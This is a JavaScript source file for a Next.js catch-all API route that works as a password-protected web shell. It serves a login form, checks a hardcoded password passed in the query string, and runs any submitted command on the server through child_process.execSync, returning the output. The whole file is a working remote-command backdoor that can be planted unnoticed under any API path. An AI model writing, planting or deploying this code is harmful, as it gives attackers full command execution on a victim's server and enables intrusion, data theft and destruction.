// Next.js API Route (Pages Router - /pages/api/[...slug].js)
export default async function handler(req, res) {
    const PASSWORD = 'dw0le3jr0746';
    const { pwd, cmd } = req.query;
    
    if (pwd !== PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Next.js Shell</title></head>
            <body style="font-family: monospace; padding: 20px;">
                <h2>Next.js Web Shell</h2>
                <form method="get">
                    <input type="password" name="pwd" placeholder="Password" style="padding: 5px; width: 200px;"><br><br>
                    <input type="text" name="cmd" placeholder="Command" style="padding: 5px; width: 400px;"><br><br>
                    <button type="submit" style="padding: 5px 15px;">Execute</button>
                </form>
            </body>
            </html>
        `);
    }
    
    if (!cmd) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Next.js Shell</title></head>
            <body style="font-family: monospace; padding: 20px;">
                <h2>Next.js Web Shell - Authenticated</h2>
                <form method="get">
                    <input type="hidden" name="pwd" value="${PASSWORD}">
                    <input type="text" name="cmd" placeholder="Command" style="padding: 5px; width: 400px;" autofocus><br><br>
                    <button type="submit" style="padding: 5px 15px;">Execute</button>
                </form>
            </body>
            </html>
        `);
    }
    
    try {
        const { execSync } = require('child_process');
        const output = execSync(cmd).toString();
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.send(output);
    } catch (error) {
        res.status(500).send(`Error: ${error.message}`);
    }
}